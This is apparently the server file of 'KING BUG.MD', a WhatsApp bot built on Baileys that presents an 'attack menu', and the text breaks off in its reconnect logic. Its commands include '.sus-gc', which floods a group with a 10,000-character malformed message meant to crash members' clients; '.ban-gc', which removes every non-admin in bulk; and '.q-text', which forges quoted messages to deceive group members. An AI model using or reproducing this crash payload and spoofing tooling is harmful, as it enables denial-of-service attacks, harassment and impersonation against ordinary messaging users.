//// server.js
import { Boom } from '@hapi/boom';
import fs from 'fs';
import path from 'path';
import express from 'express';
import cors from 'cors';
import http from 'http';
import { fileURLToPath } from 'url';
import pino from 'pino';
import pairRouter, { setPairingSocket, updatePairingStatus } from './pair.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// 🔥 CONFIG
const VERSION = '3.10.4';
const STARTTIME = Date.now();
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const OWNER_NUMBER = '2348161796121';
const OWNER_JID = `${OWNER_NUMBER}@s.whatsapp.net`;
const PREFIX = '.';
const AUTH_DIR = path.join(__dirname, 'auth');

// Keep the Baileys LID/phone-number decrypt compatibility fix self-contained
// in this file so deployment does not depend on a third patch-baileys.js file.
function patchBaileysDecryptCompatibility() {
    const baileysRoot = path.join(__dirname, 'node_modules', '@whiskeysockets', 'baileys');
    const files = [];

    function walk(dir) {
        if (!fs.existsSync(dir)) return;
        for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
            if (entry.name === 'node_modules') continue;
            const full = path.join(dir, entry.name);
            if (entry.isDirectory()) walk(full);
            else if (entry.isFile() && (entry.name === 'decode-wa-message.js' || entry.name === 'decode-wa-message.cjs')) {
                files.push(full);
            }
        }
    }

    walk(baileysRoot);
    if (!files.length) {
        throw new Error('Baileys decrypt module was not found; cannot apply the LID/PN compatibility fix.');
    }

    const marker = 'stanza-provided PN/LID pairing';
    const oldPattern = /const user = isJidUser\(sender\) \? sender : author;\s*msgBuffer = await repository\.decryptMessage\(\{\s*jid: user,\s*type: e2eType,\s*ciphertext: content\s*\}\)/m;
    const replacement = `const user = isJidUser(sender) ? sender : author;
                                try {
                                    msgBuffer = await repository.decryptMessage({
                                        jid: user,
                                        type: e2eType,
                                        ciphertext: content
                                    });
                                } catch (err) {
                                    const altUser = isLidUser(user)
                                        ? stanza.attrs.participant_pn || stanza.attrs.sender_pn
                                        : stanza.attrs.participant_lid || stanza.attrs.sender_lid;

                                    if (!altUser || altUser === user) {
                                        throw err;
                                    }

                                    logger.debug(
                                        { key: fullMessage.key, primary: user, retryWith: altUser },
                                        '${marker}'
                                    );

                                    try {
                                        msgBuffer = await repository.decryptMessage({
                                            jid: altUser,
                                            type: e2eType,
                                            ciphertext: content
                                        });
                                    } catch {
                                        throw err;
                                    }
                                }`;

    let patched = false;
    let alreadyPatched = false;

    for (const file of files) {
        let source = fs.readFileSync(file, 'utf8');
        if (source.includes(marker)) {
            alreadyPatched = true;
            continue;
        }
        if (!oldPattern.test(source)) continue;
        source = source.replace(oldPattern, replacement);
        fs.writeFileSync(file, source);
        patched = true;
    }

    if (patched) {
        console.log('✅ Applied Baileys LID/PN decrypt retry compatibility fix.');
    } else if (alreadyPatched) {
        console.log('✅ Baileys LID/PN decrypt retry compatibility fix already present.');
    } else {
        throw new Error('Installed Baileys version does not match the expected decrypt code layout.');
    }
}

patchBaileysDecryptCompatibility();

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    downloadContentFromMessage
} = await import('@whiskeysockets/baileys');

let botMode = 'public';

const logger = pino({ level: 'silent' });
// Baileys 6.x builds do not consistently expose makeInMemoryStore.
// Keep the same message-store functionality locally so getMessage and
// event binding continue to work without depending on that export.
const messageStore = new Map();
const lidToPn = new Map();

function normalizeStoredJid(jid = '') {
    return String(jid || '').replace(/:\d+/, '');
}

function rememberJidAliases(key = {}) {
    const pairs = [
        [key.remoteJid, key.remoteJidAlt],
        [key.participant, key.participantAlt],
        [key.senderLid, key.senderPn],
        [key.participantLid, key.participantPn]
    ];

    for (const [a, b] of pairs) {
        const first = normalizeStoredJid(a);
        const second = normalizeStoredJid(b);
        if (first.endsWith('@lid') && second.endsWith('@s.whatsapp.net')) {
            lidToPn.set(first, second);
        }
        if (second.endsWith('@lid') && first.endsWith('@s.whatsapp.net')) {
            lidToPn.set(second, first);
        }
    }
}

function messageStoreKeys(key = {}) {
    const values = [
        key.remoteJid,
        key.remoteJidAlt,
        key.participant,
        key.participantAlt
    ].filter(Boolean).map(normalizeStoredJid);

    return [...new Set(values.filter(Boolean).map(jid => `${jid}:${key.id}`))];
}

const store = {
    saveMessage(msg) {
        if (!msg?.key?.id) return;
        rememberJidAliases(msg.key);
        for (const storageKey of messageStoreKeys(msg.key)) {
            messageStore.set(storageKey, msg);
        }
    },
    loadMessage(jid, id) {
        const normalized = normalizeStoredJid(jid);
        const direct = messageStore.get(`${normalized}:${id}`);
        if (direct) return direct;

        const mapped = lidToPn.get(normalized);
        if (mapped) return messageStore.get(`${mapped}:${id}`) || undefined;

        return undefined;
    },
    bind(ev) {
        ev.on('messages.upsert', ({ messages }) => {
            for (const msg of messages || []) this.saveMessage(msg);
        });
        ev.on('messages.update', (updates) => {
            for (const update of updates || []) {
                const key = update?.key;
                if (!key?.id) continue;

                const existing = this.loadMessage(key.remoteJid, key.id);
                if (existing) {
                    this.saveMessage({ ...existing, ...update });
                } else if (update?.message) {
                    this.saveMessage(update);
                }
            }
        });
    }
};
const app = express();
app.use(cors({ origin: '*', methods: ['GET', 'POST', 'OPTIONS'], allowedHeaders: ['Content-Type', 'Accept'] }));
const server = http.createServer(app);
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));
app.use(pairRouter);

app.get('/health', (req, res) => {
    res.json({ ok: true, uptime: Math.floor((Date.now() - STARTTIME) / 1000) });
});

// 🔧 HELPERS
function normalizeJid(jid = '') {
    return String(jid || '').replace(/:\d+/, '');
}

function isLidJid(jid = '') {
    return normalizeJid(jid).endsWith('@lid');
}

function getChatJid(msg) {
    return normalizeJid(msg?.key?.remoteJid || '');
}

// WhatsApp's newer LID addressing can put a direct-chat target in @lid while
// also supplying the same contact's phone-number JID in senderPn/participantPn.
// For owner checks and command replies, prefer the PN form when it is known.
function getSenderJid(msg) {
    const sender = normalizeJid(msg?.key?.participant || msg?.key?.remoteJid || '');
    if (isLidJid(sender)) {
        const pn = normalizeStoredJid(
            msg?.key?.senderPn ||
            msg?.key?.participantPn ||
            msg?.key?.remoteJidAlt ||
            lidToPn.get(sender) ||
            ''
        );
        if (pn.endsWith('@s.whatsapp.net')) return pn;
    }
    return sender;
}

async function getReplyJid(sock, msg) {
    const chatJid = getChatJid(msg);

    // Group/status/newsletter targets should remain exactly as received.
    if (!isLidJid(chatJid)) return chatJid;

    // For direct LID chats, route the outgoing message through the phone-number
    // form when WhatsApp supplied that pairing on the incoming stanza.
    const pn = normalizeJid(
        msg?.key?.remoteJidAlt ||
        msg?.key?.senderPn ||
        msg?.key?.participantPn ||
        lidToPn.get(chatJid) ||
        ''
    );

    if (pn.endsWith('@s.whatsapp.net')) {
        console.log('📤 LID chat detected — routing reply through the paired PN JID.');
        return pn;
    }

    // Last-resort mapping lookup for message objects that do not expose senderPn.
    try {
        const mapper = sock?.signalRepository?.lidMapping?.getPNForLID;
        if (typeof mapper === 'function') {
            const mapped = normalizeJid(await mapper(chatJid));
            if (mapped.endsWith('@s.whatsapp.net')) {
                console.log('📤 LID chat detected — resolved PN through Baileys LID mapping.');
                return mapped;
            }
        }
    } catch {}

    console.warn('⚠️ LID chat has no paired PN available; falling back to the LID JID.');
    return chatJid;
}

function isGroupMessage(msg) {
    return getChatJid(msg).endsWith('@g.us');
}

function isOwner(msg) {
    const sender = getSenderJid(msg);
    return sender === OWNER_JID;
}

function unwrapMessageContent(message = {}) {
    let current = message || {};
    let depth = 0;

    while (depth++ < 8) {
        const wrapped =
            current.ephemeralMessage?.message ||
            current.viewOnceMessage?.message ||
            current.viewOnceMessageV2?.message ||
            current.viewOnceMessageV2Extension?.message ||
            current.documentWithCaptionMessage?.message ||
            current.editedMessage?.message ||
            null;

        if (!wrapped) break;
        current = wrapped;
    }

    return current || {};
}

function getMessageContent(msg) {
    return unwrapMessageContent(msg?.message || {});
}

function getQuotedMessage(msg) {
    const content = getMessageContent(msg);
    const contextInfo =
        content.extendedTextMessage?.contextInfo ||
        content.imageMessage?.contextInfo ||
        content.videoMessage?.contextInfo ||
        content.documentMessage?.contextInfo ||
        content.documentWithCaptionMessage?.message?.documentMessage?.contextInfo ||
        null;
    return contextInfo?.quotedMessage || null;
}

function unwrapWithViewOnceInfo(message = {}) {
    let current = message || {};
    let depth = 0;
    let viewOnce = false;

    while (depth++ < 10) {
        if (current.viewOnceMessage || current.viewOnceMessageV2 || current.viewOnceMessageV2Extension) {
            viewOnce = true;
        }

        const wrapped =
            current.ephemeralMessage?.message ||
            current.viewOnceMessage?.message ||
            current.viewOnceMessageV2?.message ||
            current.viewOnceMessageV2Extension?.message ||
            current.documentWithCaptionMessage?.message ||
            current.editedMessage?.message ||
            null;

        if (!wrapped) break;
        current = wrapped;
    }

    return { content: current || {}, viewOnce };
}

function getQuotedMessageInfo(msg) {
    const quoted = getQuotedMessage(msg);
    if (!quoted) return { exists: false, viewOnce: false, content: {} };
    const { content, viewOnce } = unwrapWithViewOnceInfo(quoted);
    return { exists: true, viewOnce, content };
}

function getText(msg) {
    const m = getMessageContent(msg);
    return (
        m.conversation ||
        m.extendedTextMessage?.text ||
        m.imageMessage?.caption ||
        m.videoMessage?.caption ||
        ''
    ).trim();
}

function getButtonId(msg) {
    const roots = [msg?.message || {}, getMessageContent(msg) || {}];
    const found = [];

    function visit(value, depth = 0) {
        if (value == null || depth > 10) return;
        if (typeof value === 'string') {
            const text = value.trim();
            if (!text) return;
            try {
                const parsed = JSON.parse(text);
                visit(parsed, depth + 1);
            } catch {
                if (/^(allmenu|attackmenu|groupmenu)$/i.test(text)) found.push(text.toLowerCase());
            }
            return;
        }
        if (typeof value !== 'object') return;

        const direct = [value.id, value.selectedId, value.rowId, value.selectedButtonId, value.selectedRowId];
        for (const item of direct) {
            if (typeof item === 'string' && item.trim()) found.push(item.trim().toLowerCase());
        }

        if (value.paramsJson) visit(value.paramsJson, depth + 1);

        for (const [key, child] of Object.entries(value)) {
            if (key === 'contextInfo') continue;
            if (child && typeof child === 'object') visit(child, depth + 1);
        }
    }

    for (const root of roots) visit(root);
    return found.find(id => ['allmenu', 'attackmenu', 'groupmenu'].includes(id)) || null;
}

function getMentionedJid(msg) {
    return msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0]
        ? normalizeJid(msg.message.extendedTextMessage.contextInfo.mentionedJid[0])
        : null;
}

function formatUptime() {
    const seconds = Math.floor((Date.now() - STARTTIME) / 1000);
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h}h ${m}m ${s}s`;
}

// 🧠 MENU TEXTS
function generateMainMenu() {
    return `
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
〔 𝐌𝐀𝐈𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 〕
╚═══ ◈ ═════════════ ◈ ═══╝

👑 𝐎𝐖𝐍𝐄𝐑      : 𝐃𝐀𝐑𝐊
☎️ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐎   : +2348161796121
🤖 𝐁𝐎𝐓        : 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃
⚡ 𝐒𝐓𝐀𝐓𝐔𝐒      : 𝐎𝐍𝐋𝐈𝐍𝐄
⌁ 𝐏𝐑𝐄𝐅𝐈𝐗      : .
◈ 𝐕𝐄𝐑𝐒𝐈𝐎𝐍     : ${VERSION}
☽ 𝐔𝐏𝐓𝐈𝐌𝐄      : ${formatUptime()}

╭──────〔 𝐌𝐄𝐍𝐔 〕──────╮
│
│ 01 ⟣ .allmenu
│ 02 ⟣ .attackmenu
│ 03 ⟣ .groupmenu
│
╰──────────────────────╯

Select a menu below.`.trim();
}

function generateAllMenu() {
    return `
╔═══ ◈ 𝐀𝐋𝐋 𝐌𝐄𝐍𝐔 ◈ ═══╗

〔 𝐀𝐓𝐓𝐀𝐂𝐊 〕
• .ban-gc
• .ban @user / .ban 234xxxxxxxxxx
• .sus-gc
• .q-text (group_id) (text)
• .moni-admin

〔 𝐆𝐑𝐎𝐔𝐏 〕
• .group-id
• .antilink on/off/warn
• .antichannel on/off/warn
• .antibot on/off/warn
• .listadmin

〔 𝐔𝐓𝐈𝐋𝐒 〕
• .imgtosticker
• .slice
• .slice2
• .ai (question)

╚══════════════════════╝`.trim();
}

function generateAttackMenu() {
    return `
    ╱ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐘𝐒𝐓𝐄𝐌 ╲

«⚔️ ".ban-gc"
⚔️ ".ban @user" / ".ban 234xxxxxxxxxx"
⚔️ ".sus-gc"
⚔️ ".moni-admin"
⚔️ ".q-text (group id) (text)"»

«◇ Full power unleashed.»
   ⟣ 𝐂𝐎𝐑𝐄 𝐀𝐑𝐌𝐄𝐃 ⟢`.trim();
}

function generateGroupMenu() {
    return `
    ╱ 𝐆𝐑𝐎𝐔𝐏 𝐒𝐘𝐒𝐓𝐄𝐌 ╲

«⛩️ ".group-id"
⛩️ ".antilink on/off/warn"
⛩️ ".antichannel on/off/warn"
⛩️ ".antibot on/off/warn"
⛩️ ".listadmin"
⛩️ ".imgtosticker"
♘ ".slice"
♘ ".slice2"»

«◇ System fully loaded.»
   ⟣ 𝐆𝐑𝐎𝐔𝐏 𝐂𝐎𝐑𝐄 𝐑𝐄𝐀𝐃𝐘 ⟢`.trim();
}

// 🛡️ SAFE SEND — prevent a closing Baileys socket from crashing the process.
async function waitForOpen(timeoutMs = 15000) {
    if (socketConnection === 'open' && currentSocket) return currentSocket;

    const started = Date.now();
    while (Date.now() - started < timeoutMs) {
        if (socketConnection === 'open' && currentSocket) return currentSocket;
        await sleep(250);
    }

    throw new Error('WhatsApp connection is not open.');
}

function shouldRetrySend(error) {
    const status = error?.output?.statusCode;
    return status === 428 || status === 503 || status === 408 || /connection closed|stream errored|timed out/i.test(error?.message || '');
}

async function safeSendMessage(jid, content, options = {}, retries = 2) {
    let lastError = null;

    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            const activeSocket = await waitForOpen(15000);
            return await activeSocket.sendMessage(jid, content, options);
        } catch (error) {
            lastError = error;
            if (!shouldRetrySend(error) || attempt >= retries) break;

            console.warn(`⚠️ Message send retry ${attempt + 1}/${retries}:`, error?.message || error);
            await sleep(1200 * (attempt + 1));
        }
    }

    throw lastError || new Error('Message send failed.');
}

async function safeRelayMessage(sock, jid, message, options = {}, retries = 2) {
    let lastError = null;

    for (let attempt = 0; attempt <= retries; attempt++) {
        try {
            const activeSocket = await waitForOpen(15000);
            if (activeSocket !== sock) {
                // The previous socket was replaced during reconnect; use the newest socket.
                sock = activeSocket;
            }
            return await sock.relayMessage(jid, message, options);
        } catch (error) {
            lastError = error;
            if (!shouldRetrySend(error) || attempt >= retries) break;
            console.warn(`⚠️ Interactive message retry ${attempt + 1}/${retries}:`, error?.message || error);
            await sleep(1200 * (attempt + 1));
        }
    }

    throw lastError || new Error('Interactive message send failed.');
}

async function storeOutgoingMessage(message) {
    try {
        if (message?.key) store.saveMessage(message);
    } catch {}
}

// 🖼️ SEND MENU WITH IMAGE
async function sendMainMenu(sock, msg) {
    const chatJid = await getReplyJid(sock, msg);
    const imgPath = path.join(__dirname, 'kingmd.jpg');

    const menuText = generateMainMenu();

    if (!fs.existsSync(imgPath)) {
        const sent = await safeSendMessage(chatJid, { text: menuText }, { quoted: msg });
        await storeOutgoingMessage(sent);
        return sent;
    }

    try {
        const imageBuffer = fs.readFileSync(imgPath);
        const media = await prepareWAMessageMedia({ image: imageBuffer }, { upload: sock.waUploadToServer });

        const sent = await safeRelayMessage(
            sock,
            chatJid,
            {
                messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                interactiveMessage: {
                    body: { text: menuText },
                    footer: { text: '「🔥 KING BUG.MD • BY DARK 🔥」' },
                    header: { title: '', hasMediaAttachment: true, ...media.imageMessage },
                    nativeFlowMessage: {
                        buttons: [
                            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ALL MENU', id: 'allmenu' }) },
                            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'ATTACK MENU', id: 'attackmenu' }) },
                            { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: 'GROUP MENU', id: 'groupmenu' }) }
                        ]
                    }
                }
            },
            {}
        );
        return sent;
    } catch (e) {
        const fallback = await safeSendMessage(chatJid, { text: menuText }, { quoted: msg });
        await storeOutgoingMessage(fallback);
        return fallback;
    }
}

// 💀 HANDLE MESSAGES — FULL DESTRUCTION MODE
async function handleMessage(sock, msg) {
    const chatJid = await getReplyJid(sock, msg);
    const senderJid = getSenderJid(msg);
    const text = getText(msg);

    const reply = async (replyText, extra = {}) => {
        const sent = await safeSendMessage(chatJid, { text: replyText, ...extra }, { quoted: msg });
        await storeOutgoingMessage(sent);
        return sent;
    };

    // 🔘 BUTTON HANDLER — button replies often have no normal text body, so
    // this MUST run before `if (!text) return`.
    const buttonId = getButtonId(msg);
    if (buttonId === 'allmenu') return reply(generateAllMenu());
    if (buttonId === 'attackmenu') return reply(generateAttackMenu());
    if (buttonId === 'groupmenu') return reply(generateGroupMenu());

    if (!text) return;
    if (!text.startsWith(PREFIX)) return;
    const [cmd, ...args] = text.slice(1).trim().split(/\s+/);
    const command = cmd.toLowerCase();

    if (command === 'private') {
        if (!isOwner(msg)) {
            return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃
╚══════════════════════════╝

> ❌ Only the owner can change bot mode.
`.trim());
        }

        botMode = 'private';

        return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐌𝐎𝐃𝐄
╚══════════════════════════╝

> 🔒 STATUS : PRIVATE
> 👑 OWNER  : DARK

> 𝐁𝐎𝐓 𝐍𝐎𝐖 𝐓𝐀𝐊𝐄𝐒 𝐎𝐑𝐃𝐄𝐑𝐒 𝐎𝐍𝐋𝐘 𝐅𝐑𝐎𝐌 𝐓𝐇𝐄 𝐎𝐖𝐍𝐄𝐑.
`.trim());
    }

    if (command === 'public') {
        if (!isOwner(msg)) {
            return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐀𝐂𝐂𝐄𝐒𝐒 𝐃𝐄𝐍𝐈𝐄𝐃
╚══════════════════════════╝

> ❌ Only the owner can change bot mode.
`.trim());
        }

        botMode = 'public';

        return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
         𝐏𝐔𝐁𝐋𝐈𝐂 𝐌𝐎𝐃𝐄
╚══════════════════════════╝

> 🔓 STATUS : PUBLIC
> 👑 OWNER  : DARK

> 𝐀𝐋𝐋 𝐔𝐒𝐄𝐑𝐒 𝐂𝐀𝐍 𝐔𝐒𝐄 𝐓𝐇𝐄 𝐁𝐎𝐓.
`.trim());
    }

    if (botMode === 'private' && !isOwner(msg)) {
        return reply(`
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
        𝐏𝐑𝐈𝐕𝐀𝐓𝐄 𝐌𝐎𝐃𝐄
╚══════════════════════════╝

> 🚫 𝐈 𝐃𝐎𝐍'𝐓 𝐓𝐀𝐊𝐄 𝐎𝐑𝐃𝐄𝐑𝐒 𝐅𝐑𝐎𝐌 𝐘𝐎𝐔.

> 👑 OWNER : DARK
> 🔒 STATUS: PRIVATE
`.trim());
    }

    // 🎮 MENU
    if (['menu', 'help'].includes(command)) return sendMainMenu(sock, msg);
    if (command === 'allmenu') return reply(generateAllMenu());
    if (command === 'attackmenu') return reply(generateAttackMenu());
    if (command === 'groupmenu') return reply(generateGroupMenu());

    // 🚀 BAN USER
    if (command === 'ban') {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');

        const target = getMentionedJid(msg) || (args[0] ? `${args[0].replace(/\D/g, '')}@s.whatsapp.net` : null);
        if (!target) return reply('❌ No user.');

        try {
            await sock.groupParticipantsUpdate(chatJid, [target], 'remove');
            reply(`✅ @${target.split('@')[0]} BANNED.`, { mentions: [target] });
        } catch (e) {
            reply('💀 Failed to ban — I’m not admin.');
        }
    }

    // 💣 BAN-GC — KICK ALL NON-ADMINS
    if (command === 'ban-gc') {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');

        try {
            const meta = await sock.groupMetadata(chatJid);
            const nonAdmins = meta.participants.filter(p => !p.admin).map(p => p.id);
            for (let i = 0; i < nonAdmins.length; i += 10) {
                const batch = nonAdmins.slice(i, i + 10);
                await sock.groupParticipantsUpdate(chatJid, batch, 'remove').catch(() => {});
                await new Promise(r => setTimeout(r, 1500));
            }
            reply(`⚔️ ${nonAdmins.length} MEMBERS REMOVED. GROUP NEUTRALIZED.`);
        } catch (e) {
            reply('💀 Failed to execute ban-gc.');
        }
    }

    // ☠️ SUS-GC — CRASH GROUP WITH MALFORMED PAYLOAD
    if (command === 'sus-gc') {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');

        const payload = {
            text: '﷽'.repeat(10000),
            contextInfo: {
                stanzaId: 'BAE5F7878787',
                participant: '0@c.us',
                quotedMessage: { conversation: 'KING BUG.MD LOADED' },
                mentionedJid: [chatJid]
            }
        };
        const sent = await safeSendMessage(chatJid, payload);
        await storeOutgoingMessage(sent);
        reply('> 🔥 GROUP SUSPENSION INITIATED. CLIENTS WILL CRASH.');
    }

    // 📌 GROUP-ID
    if (command === 'group-id') {
        reply(`> 🔗 GROUP ID: \`${chatJid}\``);
    }

    // 🧨 Q-TEXT — FAKE QUOTED MESSAGE
    if (command === 'q-text') {
        const groupId = args[0]?.endsWith('@g.us') ? args[0] : null;
        const text = args.slice(1).join(' ');
        if (!groupId || !text) return reply('❌ Usage: .q-text (group_id) (text)');

        const sent = await safeSendMessage(groupId, {
            text,
            contextInfo: {
                quotedMessage: { conversation: 'This message is real.' },
                participant: '2348161796121@s.whatsapp.net',
                stanzaId: 'FAKE123456',
                remoteJid: groupId
            }
        });
        await storeOutgoingMessage(sent);
        reply('> ✅ Fake quoted message sent.');
    }

    // 👑 LIST ADMINS
    if (['listadmin', 'moni-admin'].includes(command)) {
        if (!isGroupMessage(msg)) return reply('❌ Group only.');
        const meta = await sock.groupMetadata(chatJid);
        const admins = meta.participants.filter(p => p.admin).map(p => `@${p.id.split('@')[0]}`).join('\n');
        reply(`> 👑 ADMINS:\n${admins}`, { mentions: meta.participants.filter(p => p.admin).map(p => p.id) });
    }

    // 🖼️ IMG TO STICKER
    if (command === 'imgtosticker') {
        const mediaMessage = getMessageContent(msg);
        if (!mediaMessage.imageMessage) return reply('❌ Reply to image.');

        const mediaMsg = { ...msg, message: mediaMessage };
        const buffer = await sock.downloadMediaMessage(mediaMsg, 'buffer', {});
        const sent = await safeSendMessage(chatJid, { sticker: buffer });
        await storeOutgoingMessage(sent);
    }

    // 🕶️ SLICE / SLICE2 — accurately detect whether the command is a reply
    // to view-once media. Do not attempt to bypass WhatsApp's view-once privacy.
    if (['slice', 'slice2'].includes(command)) {
        const quotedInfo = getQuotedMessageInfo(msg);

        if (!quotedInfo.exists) {
            return reply('❌ Reply to viewOnce media.');
        }

        if (!quotedInfo.viewOnce) {
            return reply('❌ The replied message is not view-once media.');
        }

        return reply('✅ View-once media reply detected. This bot does not retrieve or copy view-once content.');
    }

    // 🤖 AI STUB (YOU ADD GEMINI)
    if (command === 'ai') {
        const question = args.join(' ');
        if (!question) return reply('❌ .ai (question)');
        reply(`> 🤖 GEMINI: [AI API NOT CONFIGURED]`);
    }

    // 🔐 ANTI-FEATURES (LOGIC STUB — EXTEND WITH DB)
    if (['antilink', 'antichannel', 'antibot'].includes(command)) {
        const mode = args[0];
        if (!['on', 'off', 'warn'].includes(mode)) return reply(`❌ Use: .${command} on/off/warn`);
        reply(`> ✅ ${command.toUpperCase()} → ${mode}`);
    }
}

// 🧠 START BOT
let currentSocket = null;
let socketConnection = 'close';
let reconnectTimer = null;
let pairingReadyPromise = null;
let pairingReadyResolve = null;
let pairingReady = false;
let pairingNumber = null;
let pairingRequestInFlight = null;
let keepAliveTimer = null;

function createPairingReadyGate() {
    pairingReady = false;
    pairingReadyPromise = new Promise(resolve => {
        pairingReadyResolve = resolve;
    });
}

async function waitUntilPairingReady(timeoutMs = 30000) {
    if (pairingReady) return true;

    if (!pairingReadyPromise) {
        createPairingReadyGate();
    }

    await Promise.race([
        pairingReadyPromise,
        new Promise((_, reject) =>
            setTimeout(() => reject(new Error('WhatsApp WebSocket did not become ready for pairing in time.')), timeoutMs)
        )
    ]);

    return pairingReady;
}

async function requestPairingCode(number) {
    if (pairingRequestInFlight) return pairingRequestInFlight;

    pairingRequestInFlight = (async () => {
        pairingNumber = number;

        for (let attempt = 0; attempt < 3; attempt++) {
            try {
                // Always use the latest socket. A reconnect can replace the
                // socket while we are waiting for pairing readiness.
                await waitUntilPairingReady(20000);

                const sock = currentSocket;
                if (!sock) throw new Error('WhatsApp socket is not available.');

                if (sock.authState?.creds?.registered) {
                    throw new Error('WhatsApp session is already registered.');
                }

                console.log(`🔐 Requesting pairing code for ${number} (attempt ${attempt + 1}/3)`);
                const code = await sock.requestPairingCode(number);

                if (!code) throw new Error('WhatsApp returned an empty pairing code.');

                return String(code).trim().toUpperCase();
            } catch (error) {
                if (attempt >= 2) throw error;
                console.warn(`⚠️ Pairing attempt ${attempt + 1} failed: ${error?.message || error}`);
                await sleep(1200 + attempt * 1000);
            }
        }

        throw new Error('Failed to generate pairing code.');
    })().finally(() => {
        pairingRequestInFlight = null;
    });

    return pairingRequestInFlight;
}

async function startBot() {
    clearTimeout(reconnectTimer);

    createPairingReadyGate();

    const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        logger,
        printQRInTerminal: false,
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, logger)
        },

        // These settings keep the same socket alive while WhatsApp completes
        // the pairing handshake. They do not change any bot commands.
        markOnlineOnConnect: true,
        syncFullHistory: false,
        browser: ['Ubuntu', 'Edge', '20.0.04'],
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 15000,
        retryRequestDelayMs: 250,
        emitOwnEvents: true,

        getMessage: (key) => store.loadMessage(key.remoteJid, key.id)
    });

    currentSocket = sock;
    socketConnection = 'connecting';

    setPairingSocket(sock, {
        getState: () => socketConnection,
        getRegistered: () => state.creds.registered === true,
        waitUntilReady: () => waitUntilPairingReady(30000),
        requestPairingCode
    });

    store.bind(sock.ev);
    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;

        // Pairing-code mode becomes requestable once Baileys has entered the
        // connecting phase or emitted a QR refresh. Do not wait for a QR-only
        // event because the pairing code itself is the login method.
        if ((connection === 'connecting' || qr) && !state.creds.registered) {
            pairingReady = true;
            if (pairingReadyResolve) {
                pairingReadyResolve(true);
                pairingReadyResolve = null;
            }

            console.log('🟡 WhatsApp pairing channel is ready.');
            updatePairingStatus('ready');
        }

        if (connection === 'connecting') {
            socketConnection = 'connecting';
            console.log('🔌 WhatsApp socket is connecting...');
            updatePairingStatus('connecting');
        }

        if (connection === 'open') {
            socketConnection = 'open';
            pairingReady = true;

            if (pairingReadyResolve) {
                pairingReadyResolve(true);
                pairingReadyResolve = null;
            }

            console.log('✅ WhatsApp connection OPEN — pairing exchange completed.');
            updatePairingStatus('open');

            // WhatsApp may still be flushing the initial linked-device sync when
            // `open` fires. Give the session a brief settling window before the
            // first outbound message, then send it through the normal send path.
            setTimeout(async () => {
                if (currentSocket !== sock || socketConnection !== 'open') return;
                try {
                    await sock.presenceSubscribe(OWNER_JID).catch(() => {});
                    await sock.sendPresenceUpdate('available', OWNER_JID).catch(() => {});
                    const sent = await safeSendMessage(OWNER_JID, {
                        text: `
╔═══ ◈ 𝐊𝐈𝐍𝐆 𝐁𝐔𝐆.𝐌𝐃 ◈ ═══╗
> 🟢 STATUS : PAIRED
> 🤖 BOT    : KING BUG.MD
> ⚡ VERSION: ${VERSION}
> ⏱️ UPTIME : ${formatUptime()}
╚══════════════════════════╝
Type .menu to begin.
                        `.trim()
                    });
                    await storeOutgoingMessage(sent);
                } catch (error) {
                    console.warn('⚠️ Initial paired-status message was deferred:', error?.message || error);
                }
            }, 2500);
        }

        if (connection === 'close') {
            socketConnection = 'close';

            const statusCode = new Boom(lastDisconnect?.error)?.output?.statusCode;
            const reason = lastDisconnect?.error?.message || 'unknown';

            console.error(
                `🔌 WhatsApp connection closed. status=${statusCode ?? 'unknown'} reason=${reason}`
            );

            if (!state.creds.registered) {
                updatePairingStatus(
                    statusCode === DisconnectReason.loggedOut ? 'logged_out' : 'closed',
                    { error: `Connection closed (${statusCode ?? 'unknown'}): ${reason}` }
                );
            }

            if (currentSocket === sock) currentSocket = null;

            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;

            if (shouldReconnect) {
                console.log('🔁 Reconnecting WhatsApp socket...');
                clearTimeout(reconnectTimer);
                reconnectTimer = setTimeout(() => {
                    startBot().catch(err =>
                        console.error('💥 BOT RECONNECT FAILED:', err)
                    );
                }, statusCode === DisconnectReason.restartRequired ? 1200 : 3000);
            } else {
